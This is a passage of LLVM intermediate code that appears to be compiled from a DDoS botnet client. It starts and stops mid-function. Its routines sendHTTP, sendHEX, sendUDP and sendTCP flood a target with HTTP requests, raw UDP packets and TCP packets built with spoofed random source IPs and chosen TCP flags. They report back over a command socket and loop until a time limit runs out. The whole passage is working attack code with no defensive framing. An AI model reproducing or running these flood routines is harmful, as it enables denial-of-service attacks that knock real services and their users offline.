  %37 = call i8* @strcpy(i8* %36, i8* %0) #3
  %38 = call i64 @strlen(i8* nonnull %19) #14
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %38
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.82, i64 0, i64 0), i64 15, i32 1, i1 false)
  %40 = call i64 @strlen(i8* nonnull %19) #14
  %41 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %40
  %42 = call i32 @rand() #3
  %43 = and i32 %42, 31
  %44 = zext i32 %43 to i64
  %45 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %44
  %46 = load i8*, i8** %45, align 8
  %47 = call i8* @strcpy(i8* %41, i8* %46) #3
  %48 = call i64 @strlen(i8* nonnull %19) #14
  %49 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %48
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %49, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.83, i64 0, i64 0), i64 15, i32 1, i1 false)
  %50 = call i64 @strlen(i8* nonnull %19) #14
  %51 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %50
  %52 = call i32 @rand() #3
  %53 = sext i32 %52 to i64
  %54 = urem i64 %53, 3
  %55 = getelementptr inbounds [3 x i8*], [3 x i8*]* @sendHTTP.connections, i64 0, i64 %54
  %56 = load i8*, i8** %55, align 8
  %57 = call i8* @strcpy(i8* %51, i8* %56) #3
  %58 = call i64 @strlen(i8* nonnull %19) #14
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %58
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %59, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.84, i64 0, i64 0), i64 5, i32 1, i1 false)
  %60 = call i64 @strlen(i8* nonnull %19) #14
  %61 = call i64 @write(i32 %22, i8* nonnull %19, i64 %60) #3
  %62 = call i64 @read(i32 %22, i8* nonnull %20, i64 1) #3
  %63 = call i32 @close(i32 %22) #3
  br label %64

; <label>:64:                                     ; preds = %21, %24
  %65 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %66 = sext i32 %65 to i64
  %67 = icmp slt i64 %66, %18
  br i1 %67, label %21, label %68

; <label>:68:                                     ; preds = %64
  call void @_exit(i32 0) #16
  unreachable

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendHEX(i8*, i8*, i16 zeroext, i8* nocapture readnone, i32, i32) local_unnamed_addr #1 {
  %7 = alloca [512 x i8], align 16
  %8 = alloca [1 x i8], align 1
  %9 = alloca [2048 x i8], align 16
  %10 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %11 = add nsw i32 %10, %4
  %12 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %12, i8* getelementptr inbounds ([265 x i8], [265 x i8]* @.str.85, i64 0, i64 0), i64 265, i32 1, i1 false)
  %13 = icmp sgt i32 %5, 0
  br i1 %13, label %.lr.ph14, label %._crit_edge15

.lr.ph14:                                         ; preds = %6
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  br label %17

; <label>:15:                                     ; preds = %17
  %16 = icmp slt i32 %26, %5
  br i1 %16, label %17, label %._crit_edge15.loopexit

; <label>:17:                                     ; preds = %.lr.ph14, %15
  %.012 = phi i32 [ 0, %.lr.ph14 ], [ %26, %15 ]
  %18 = call i32 @rand() #3
  %19 = srem i32 %18, 36
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %20
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %14, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.86, i64 0, i64 0), i8* %0, i8* nonnull %12, i8* %1, i8* %22)
  %24 = call i32 @fork() #3
  %25 = icmp eq i32 %24, 0
  %26 = add nuw nsw i32 %.012, 1
  br i1 %25, label %15, label %.preheader

.preheader:                                       ; preds = %17
  %27 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %28 = icmp sgt i32 %11, %27
  br i1 %28, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %.preheader
  %29 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  br label %30

; <label>:30:                                     ; preds = %.lr.ph, %.backedge
  %31 = call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %.backedge, label %33

; <label>:33:                                     ; preds = %30
  %34 = call i64 @strlen(i8* nonnull %14) #14
  %35 = call i64 @write(i32 %31, i8* nonnull %14, i64 %34) #3
  %36 = call i64 @read(i32 %31, i8* nonnull %29, i64 1) #3
  %37 = call i32 @close(i32 %31) #3
  br label %.backedge

.backedge:                                        ; preds = %33, %30
  %38 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %39 = icmp sgt i32 %11, %38
  br i1 %39, label %30, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  call void @exit(i32 0) #16
  unreachable

._crit_edge15.loopexit:                           ; preds = %15
  br label %._crit_edge15

._crit_edge15:                                    ; preds = %._crit_edge15.loopexit, %6
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #5

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = icmp eq i32 %1, 0
  br i1 %12, label %13, label %16

; <label>:13:                                     ; preds = %8
  %14 = tail call i32 @rand_cmwc()
  %15 = trunc i32 %14 to i16
  br label %19

; <label>:16:                                     ; preds = %8
  %17 = trunc i32 %1 to i16
  %18 = tail call zeroext i16 @htons(i16 zeroext %17) #17
  br label %19

; <label>:19:                                     ; preds = %16, %13
  %.sink = phi i16 [ %18, %16 ], [ %15, %13 ]
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 1
  store i16 %.sink, i16* %20, align 2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 2
  %22 = call i32 @getHost(i8* %0, %struct.in_addr* %21)
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %24, label %.loopexit

; <label>:24:                                     ; preds = %19
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 3, i64 0
  %26 = bitcast i8* %25 to i64*
  store i64 0, i64* %26, align 4
  %27 = icmp eq i32 %3, 32
  br i1 %27, label %28, label %71

; <label>:28:                                     ; preds = %24
  %29 = tail call i32 @socket(i32 2, i32 2, i32 17) #3
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %34

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* @mainCommSock, align 4
  %33 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %32, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i64 0, i64 0))
  br label %.loopexit

; <label>:34:                                     ; preds = %28
  %35 = add nsw i32 %4, 1
  %36 = sext i32 %35 to i64
  %37 = tail call noalias i8* @malloc(i64 %36) #3
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit, label %39

; <label>:39:                                     ; preds = %34
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %37, i8 0, i64 %36, i32 1, i1 false)
  tail call void @RandString(i8* nonnull %37, i32 %4)
  %40 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %41 = add nsw i32 %40, %2
  %42 = sext i32 %4 to i64
  %43 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %44 = mul nsw i32 %7, 1000
  br i1 %12, label %.outer.us.preheader, label %.outer.preheader

.outer.preheader:                                 ; preds = %39
  br label %.outer

.outer.us.preheader:                              ; preds = %39
  br label %.outer.us

.outer.us:                                        ; preds = %.outer.us.backedge, %.outer.us.preheader
  %.068.ph.us = phi i32 [ 0, %.outer.us.preheader ], [ %.068.ph.us.be, %.outer.us.backedge ]
  %.067.ph.us = phi i32 [ 0, %.outer.us.preheader ], [ %57, %.outer.us.backedge ]
  br label %49

; <label>:45:                                     ; preds = %.us-lcssa.us.us
  %46 = add i32 %.068.ph.us, 1
  br label %.outer.us.backedge

; <label>:47:                                     ; preds = %.us-lcssa.us.us
  %48 = call i32 @usleep(i32 %44) #3
  br label %.outer.us.backedge

.outer.us.backedge:                               ; preds = %47, %45
  %.068.ph.us.be = phi i32 [ %46, %45 ], [ 0, %47 ]
  br label %.outer.us

; <label>:49:                                     ; preds = %.outer.us, %52
  %.067.us.us = phi i32 [ 0, %52 ], [ %.067.ph.us, %.outer.us ]
  %50 = call i64 @sendto(i32 %29, i8* nonnull %37, i64 %42, i32 0, %struct.sockaddr* nonnull %43, i32 16) #3
  %51 = icmp eq i32 %.067.us.us, %5
  br i1 %51, label %52, label %.us-lcssa.us.us

; <label>:52:                                     ; preds = %49
  %53 = call i32 @rand_cmwc()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %20, align 2
  %55 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %56 = icmp sgt i32 %55, %41
  br i1 %56, label %.loopexit.loopexit, label %49

.us-lcssa.us.us:                                  ; preds = %49
  %57 = add i32 %.067.us.us, 1
  %58 = icmp eq i32 %.068.ph.us, %6
  br i1 %58, label %47, label %45

.outer:                                           ; preds = %.outer.backedge, %.outer.preheader
  %.068.ph = phi i32 [ 0, %.outer.preheader ], [ %.068.ph.be, %.outer.backedge ]
  %.067.ph = phi i32 [ 0, %.outer.preheader ], [ %65, %.outer.backedge ]
  br label %59

; <label>:59:                                     ; preds = %.outer, %62
  %.067 = phi i32 [ 0, %62 ], [ %.067.ph, %.outer ]
  %60 = call i64 @sendto(i32 %29, i8* nonnull %37, i64 %42, i32 0, %struct.sockaddr* nonnull %43, i32 16) #3
  %61 = icmp eq i32 %.067, %5
  br i1 %61, label %62, label %.us-lcssa

; <label>:62:                                     ; preds = %59
  %63 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %64 = icmp sgt i32 %63, %41
  br i1 %64, label %.loopexit.loopexit104, label %59

.us-lcssa:                                        ; preds = %59
  %65 = add i32 %.067, 1
  %66 = icmp eq i32 %.068.ph, %6
  br i1 %66, label %67, label %69

; <label>:67:                                     ; preds = %.us-lcssa
  %68 = call i32 @usleep(i32 %44) #3
  br label %.outer.backedge

.outer.backedge:                                  ; preds = %67, %69
  %.068.ph.be = phi i32 [ %70, %69 ], [ 0, %67 ]
  br label %.outer

; <label>:69:                                     ; preds = %.us-lcssa
  %70 = add i32 %.068.ph, 1
  br label %.outer.backedge

; <label>:71:                                     ; preds = %24
  %72 = tail call i32 @socket(i32 2, i32 3, i32 17) #3
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %71
  %75 = load i32, i32* @mainCommSock, align 4
  %76 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %75, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i64 0, i64 0))
  br label %.loopexit

; <label>:77:                                     ; preds = %71
  store i32 1, i32* %10, align 4
  %78 = bitcast i32* %10 to i8*
  %79 = call i32 @setsockopt(i32 %72, i32 0, i32 3, i8* nonnull %78, i32 4) #3
  %80 = icmp slt i32 %79, 0
  br i1 %80, label %81, label %.preheader.preheader

.preheader.preheader:                             ; preds = %77
  br label %.preheader

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* @mainCommSock, align 4
  %83 = call i32 (i32, i8*, ...) @sockprintf(i32 %82, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.88, i64 0, i64 0))
  br label %.loopexit

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.06985 = phi i32 [ %84, %.preheader ], [ 50, %.preheader.preheader ]
  %84 = add nsw i32 %.06985, -1
  %85 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %86 = call i32 @rand_cmwc()
  %87 = xor i32 %86, %85
  call void @srand(i32 %87) #3
  %88 = call i32 @rand() #3
  call void @init_rand(i32 %88)
  %89 = icmp eq i32 %84, 0
  br i1 %89, label %90, label %.preheader

; <label>:90:                                     ; preds = %.preheader
  %91 = icmp eq i32 %3, 0
  %92 = sub nsw i32 32, %3
  %93 = shl i32 -1, %92
  %.070 = select i1 %91, i32 0, i32 %93
  %94 = sext i32 %4 to i64
  %95 = add nsw i64 %94, 28
  %96 = call i8* @llvm.stacksave()
  %97 = alloca i8, i64 %95, align 16
  %98 = bitcast i8* %97 to %struct.iphdr*
  %99 = getelementptr i8, i8* %97, i64 20
  %100 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i64 0, i32 0
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @GetRandomIP(i32 %.070)
  %103 = call i32 @htonl(i32 %102) #17
  %104 = add nsw i64 %94, 8
  %105 = trunc i64 %104 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %98, i32 %101, i32 %103, i8 zeroext 17, i32 %105)
  %106 = trunc i64 %104 to i16
  %107 = call zeroext i16 @htons(i16 zeroext %106) #17
  %108 = getelementptr inbounds i8, i8* %97, i64 24
  %109 = bitcast i8* %108 to i16*
  store i16 %107, i16* %109, align 8
  %110 = call i32 @rand_cmwc()
  %111 = trunc i32 %110 to i16
  %112 = bitcast i8* %99 to i16*
  store i16 %111, i16* %112, align 4
  br i1 %12, label %113, label %115

; <label>:113:                                    ; preds = %90
  %114 = call i32 @rand_cmwc()
  br label %119

; <label>:115:                                    ; preds = %90
  %116 = trunc i32 %1 to i16
  %117 = call zeroext i16 @htons(i16 zeroext %116) #17
  %118 = zext i16 %117 to i32
  br label %119

; <label>:119:                                    ; preds = %115, %113
  %.pre-phi = phi i16 [ %116, %115 ], [ 0, %113 ]
  %120 = phi i32 [ %118, %115 ], [ %114, %113 ]
  %121 = trunc i32 %120 to i16
  %122 = getelementptr inbounds i8, i8* %97, i64 22
  %123 = bitcast i8* %122 to i16*
  store i16 %121, i16* %123, align 2
  %124 = getelementptr inbounds i8, i8* %97, i64 26
  %125 = bitcast i8* %124 to i16*
  store i16 0, i16* %125, align 2
  %126 = getelementptr inbounds i8, i8* %97, i64 28
  call void @RandString(i8* %126, i32 %4)
  %127 = bitcast i8* %97 to i16*
  %128 = getelementptr inbounds i8, i8* %97, i64 2
  %129 = bitcast i8* %128 to i16*
  %130 = load i16, i16* %129, align 2
  %131 = zext i16 %130 to i32
  %132 = call zeroext i16 @csum(i16* nonnull %127, i32 %131)
  %133 = getelementptr inbounds i8, i8* %97, i64 10
  %134 = bitcast i8* %133 to i16*
  store i16 %132, i16* %134, align 2
  %135 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %136 = add nsw i32 %135, %2
  %137 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %138 = getelementptr inbounds i8, i8* %97, i64 4
  %139 = bitcast i8* %138 to i16*
  %140 = getelementptr inbounds i8, i8* %97, i64 12
  %141 = bitcast i8* %140 to i32*
  %142 = mul nsw i32 %7, 1000
  br i1 %12, label %.outer71.us.preheader, label %.outer71.preheader

.outer71.preheader:                               ; preds = %119
  br label %.outer71

.outer71.us.preheader:                            ; preds = %119
  br label %.outer71.us

.outer71.us:                                      ; preds = %.outer71.us.backedge, %.outer71.us.preheader
  %.066.ph.us = phi i32 [ 0, %.outer71.us.preheader ], [ %164, %.outer71.us.backedge ]
  %.0.ph.us = phi i32 [ 0, %.outer71.us.preheader ], [ %.0.ph.us.be, %.outer71.us.backedge ]
  br label %147

; <label>:143:                                    ; preds = %.us-lcssa78.us.us
  %144 = add i32 %.0.ph.us, 1
  br label %.outer71.us.backedge

; <label>:145:                                    ; preds = %.us-lcssa78.us.us
  %146 = call i32 @usleep(i32 %142) #3
  br label %.outer71.us.backedge

.outer71.us.backedge:                             ; preds = %145, %143
  %.0.ph.us.be = phi i32 [ 0, %145 ], [ %144, %143 ]
  br label %.outer71.us

; <label>:147:                                    ; preds = %.outer71.us, %161
  %.066.us.us = phi i32 [ 0, %161 ], [ %.066.ph.us, %.outer71.us ]
  %148 = call i64 @sendto(i32 %72, i8* nonnull %97, i64 %95, i32 0, %struct.sockaddr* nonnull %137, i32 16) #3
  %149 = call i32 @rand_cmwc()
  %150 = trunc i32 %149 to i16
  store i16 %150, i16* %112, align 4
  %151 = call i32 @rand_cmwc()
  %152 = trunc i32 %151 to i16
  store i16 %152, i16* %123, align 2
  %153 = call i32 @rand_cmwc()
  %154 = trunc i32 %153 to i16
  store i16 %154, i16* %139, align 4
  %155 = call i32 @GetRandomIP(i32 %.070)
  %156 = call i32 @htonl(i32 %155) #17
  store i32 %156, i32* %141, align 4
  %157 = load i16, i16* %129, align 2
  %158 = zext i16 %157 to i32
  %159 = call zeroext i16 @csum(i16* nonnull %127, i32 %158)
  store i16 %159, i16* %134, align 2
  %160 = icmp eq i32 %.066.us.us, %5
  br i1 %160, label %161, label %.us-lcssa78.us.us

; <label>:161:                                    ; preds = %147
  %162 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %163 = icmp sgt i32 %162, %136
  br i1 %163, label %.us-lcssa79.us.loopexit, label %147

.us-lcssa78.us.us:                                ; preds = %147
  %164 = add i32 %.066.us.us, 1
  %165 = icmp eq i32 %.0.ph.us, %6
  br i1 %165, label %145, label %143

.outer71:                                         ; preds = %.outer71.backedge, %.outer71.preheader
  %.066.ph = phi i32 [ 0, %.outer71.preheader ], [ %182, %.outer71.backedge ]
  %.0.ph = phi i32 [ 0, %.outer71.preheader ], [ %.0.ph.be, %.outer71.backedge ]
  br label %166

; <label>:166:                                    ; preds = %.outer71, %179
  %.066 = phi i32 [ 0, %179 ], [ %.066.ph, %.outer71 ]
  %167 = call i64 @sendto(i32 %72, i8* nonnull %97, i64 %95, i32 0, %struct.sockaddr* nonnull %137, i32 16) #3
  %168 = call i32 @rand_cmwc()
  %169 = trunc i32 %168 to i16
  store i16 %169, i16* %112, align 4
  %170 = call zeroext i16 @htons(i16 zeroext %.pre-phi) #17
  store i16 %170, i16* %123, align 2
  %171 = call i32 @rand_cmwc()
  %172 = trunc i32 %171 to i16
  store i16 %172, i16* %139, align 4
  %173 = call i32 @GetRandomIP(i32 %.070)
  %174 = call i32 @htonl(i32 %173) #17
  store i32 %174, i32* %141, align 4
  %175 = load i16, i16* %129, align 2
  %176 = zext i16 %175 to i32
  %177 = call zeroext i16 @csum(i16* nonnull %127, i32 %176)
  store i16 %177, i16* %134, align 2
  %178 = icmp eq i32 %.066, %5
  br i1 %178, label %179, label %.us-lcssa78

; <label>:179:                                    ; preds = %166
  %180 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %181 = icmp sgt i32 %180, %136
  br i1 %181, label %.us-lcssa79.us.loopexit105, label %166

.us-lcssa78:                                      ; preds = %166
  %182 = add i32 %.066, 1
  %183 = icmp eq i32 %.0.ph, %6
  br i1 %183, label %184, label %186

; <label>:184:                                    ; preds = %.us-lcssa78
  %185 = call i32 @usleep(i32 %142) #3
  br label %.outer71.backedge

.outer71.backedge:                                ; preds = %184, %186
  %.0.ph.be = phi i32 [ 0, %184 ], [ %187, %186 ]
  br label %.outer71

; <label>:186:                                    ; preds = %.us-lcssa78
  %187 = add i32 %.0.ph, 1
  br label %.outer71.backedge

.us-lcssa79.us.loopexit:                          ; preds = %161
  br label %.us-lcssa79.us

.us-lcssa79.us.loopexit105:                       ; preds = %179
  br label %.us-lcssa79.us

.us-lcssa79.us:                                   ; preds = %.us-lcssa79.us.loopexit105, %.us-lcssa79.us.loopexit
  call void @llvm.stackrestore(i8* %96)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %52
  br label %.loopexit

.loopexit.loopexit104:                            ; preds = %62
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit104, %.loopexit.loopexit, %19, %34, %.us-lcssa79.us, %81, %74, %31
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #4

declare i32 @usleep(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #17
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %164

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #3
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @mainCommSock, align 4
  %30 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %29, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i64 0, i64 0))
  br label %164

; <label>:31:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %32 = bitcast i32* %9 to i8*
  %33 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %32, i32 4) #3
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %31
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.88, i64 0, i64 0))
  br label %164

; <label>:38:                                     ; preds = %31
  %39 = icmp eq i32 %3, 0
  %40 = sub nsw i32 32, %3
  %41 = shl i32 -1, %40
  %.065 = select i1 %39, i32 0, i32 %41
  %42 = sext i32 %5 to i64
  %43 = add nsw i64 %42, 40
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = bitcast i8* %47 to %struct.tcphdr*
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = call i32 @GetRandomIP(i32 %.065)
  %52 = call i32 @htonl(i32 %51) #17
  %53 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %50, i32 %52, i8 zeroext 6, i32 %53)
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = bitcast i8* %47 to i16*
  store i16 %55, i16* %56, align 4
  %57 = call i32 @rand_cmwc()
  %58 = getelementptr inbounds i8, i8* %45, i64 24
  %59 = bitcast i8* %58 to i32*
  store i32 %57, i32* %59, align 8
  %60 = getelementptr inbounds i8, i8* %45, i64 28
  %61 = bitcast i8* %60 to i32*
  store i32 0, i32* %61, align 4
  %62 = getelementptr inbounds i8, i8* %45, i64 32
  %63 = bitcast i8* %62 to i16*
  %64 = load i16, i16* %63, align 16
  %65 = and i16 %64, -241
  %66 = or i16 %65, 80
  store i16 %66, i16* %63, align 16
  %67 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i64 0, i64 0)) #14
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %69, label %72

; <label>:69:                                     ; preds = %38
  %70 = and i16 %64, -8177
  %71 = or i16 %70, 8016
  store i16 %71, i16* %63, align 16
  br label %.loopexit

; <label>:72:                                     ; preds = %38
  %73 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i64 0, i64 0)) #3
  %74 = icmp eq i8* %73, null
  br i1 %74, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %72
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %107
  %.06667 = phi i8* [ %108, %107 ], [ %73, %.lr.ph.preheader ]
  %75 = call i32 @strcmp(i8* nonnull %.06667, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.91, i64 0, i64 0)) #14
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %.lr.ph
  %78 = load i16, i16* %63, align 16
  %79 = or i16 %78, 512
  store i16 %79, i16* %63, align 16
  br label %107

; <label>:80:                                     ; preds = %.lr.ph
  %81 = call i32 @strcmp(i8* nonnull %.06667, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.92, i64 0, i64 0)) #14
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %86

; <label>:83:                                     ; preds = %80
  %84 = load i16, i16* %63, align 16
  %85 = or i16 %84, 1024
  store i16 %85, i16* %63, align 16
  br label %107

; <label>:86:                                     ; preds = %80
  %87 = call i32 @strcmp(i8* nonnull %.06667, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.93, i64 0, i64 0)) #14
  %88 = icmp eq i32 %87, 0
  br i1 %88, label %89, label %92

; <label>:89:                                     ; preds = %86
  %90 = load i16, i16* %63, align 16
  %91 = or i16 %90, 256
  store i16 %91, i16* %63, align 16
  br label %107

; <label>:92:                                     ; preds = %86
  %93 = call i32 @strcmp(i8* nonnull %.06667, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.94, i64 0, i64 0)) #14
  %94 = icmp eq i32 %93, 0
  br i1 %94, label %95, label %98

; <label>:95:                                     ; preds = %92
  %96 = load i16, i16* %63, align 16
  %97 = or i16 %96, 4096
  store i16 %97, i16* %63, align 16
  br label %107

; <label>:98:                                     ; preds = %92
  %99 = call i32 @strcmp(i8* nonnull %.06667, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.95, i64 0, i64 0)) #14
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %101, label %104

; <label>:101:                                    ; preds = %98
  %102 = load i16, i16* %63, align 16
  %103 = or i16 %102, 2048
  store i16 %103, i16* %63, align 16
  br label %107

; <label>:104:                                    ; preds = %98
  %105 = load i32, i32* @mainCommSock, align 4
  %106 = call i32 (i32, i8*, ...) @sockprintf(i32 %105, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.96, i64 0, i64 0), i8* nonnull %.06667)
  br label %107

; <label>:107:                                    ; preds = %83, %95, %104, %101, %89, %77
  %108 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i64 0, i64 0)) #3
  %109 = icmp eq i8* %108, null
  br i1 %109, label %.loopexit.loopexit, label %.lr.ph

.loopexit.loopexit:                               ; preds = %107
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %72, %69
  %110 = call i32 @rand_cmwc()
  %111 = trunc i32 %110 to i16
  %112 = getelementptr inbounds i8, i8* %45, i64 34
  %113 = bitcast i8* %112 to i16*
  store i16 %111, i16* %113, align 2
  %114 = getelementptr inbounds i8, i8* %45, i64 36
  %115 = bitcast i8* %114 to i16*
  store i16 0, i16* %115, align 4
  %116 = getelementptr inbounds i8, i8* %45, i64 38
  %117 = bitcast i8* %116 to i16*
  store i16 0, i16* %117, align 2
  br i1 %11, label %118, label %120

; <label>:118:                                    ; preds = %.loopexit
  %119 = call i32 @rand_cmwc()
  br label %124

; <label>:120:                                    ; preds = %.loopexit
  %121 = trunc i32 %1 to i16
  %122 = call zeroext i16 @htons(i16 zeroext %121) #17
